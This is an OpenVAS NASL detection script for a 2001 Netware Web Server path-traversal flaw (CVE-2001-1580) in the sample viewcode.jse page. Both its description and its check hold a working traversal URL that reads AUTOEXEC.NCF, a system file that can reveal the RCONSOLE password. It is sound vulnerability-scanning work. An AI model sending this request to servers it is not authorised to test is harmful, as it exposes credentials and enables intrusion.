# OpenVAS Vulnerability Test
# $Id: novell_viewcode.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Netware Web Server Sample Page Source Disclosure
#
# Authors:
# David Kyger <david_kyger@symantec.com>
# Updated By: Antu Sanadi <santu@secpod> on 2010-07-06
# Updated CVE, CVSS Base and Risk factor  
#
# Copyright:
# Copyright (C) 2002 David Kyger
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "On a Netware Web Server, viewcode.jse allows the source code of web pages to 
be viewed. As an argument, a URL is passed to sewse.nlm. The URL can be 
altered and will permit files outside of the web root to be viewed. 
As a result, sensitive information could be obtained from the Netware server, 
such as the RCONSOLE password located in AUTOEXEC.NCF.

Example: http://target//lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf";

tag_solution = "Remove sample NLMs and default files from the web server.
Also, ensure the RCONSOLE password is encrypted and utilize a password 
protected screensaver for console access.";

if(description)
{
  script_id(12048);
  script_version("$Revision: 17 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(3715);
  script_cve_id("CVE-2001-1580");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
 
  name = "Netware Web Server Sample Page Source Disclosure";
 script_name(name);
 
 desc = "
  Summary:
  " + tag_summary;

 script_description(desc);
 
 summary = "Checks for Netware Web Server Source Disclosure";
 
 script_summary(summary);
 
 script_category(ACT_GATHER_INFO);
 script_copyright("This script is Copyright (C) 2002 David Kyger");
 family = "Netware";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/246358");
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

warning = string("
On a Netware Web Server, viewcode.jse allows the source code of web pages to 
be viewed. As an argument, a URL is passed to sewse.nlm. The URL can be 
altered and will permit files outside of the web root to be viewed. 
As a result, sensitive information could be obtained from the Netware server, 
such as the RCONSOLE password located in AUTOEXEC.NCF.



The content of the AUTOEXEC.NCF follows:");

url = "/lcgi/sewse.nlm?sys:/novonyx/suitespot/docs/sewse/viewcode.jse+httplist+httplist/../../../../../system/autoexec.ncf";
 
port = get_http_port(default:80);

 
if(get_port_state(port))
 {
   req = http_get(item:url, port:port);
   buf = http_keepalive_send_recv(port:port, data:req);
   if ("AUTOEXEC.NCF" >< buf)
    {
     warning = warning + string("\n", buf) + "

  Solution:
  " + tag_solution;     security_warning(port:port, data:warning);
    }
 }


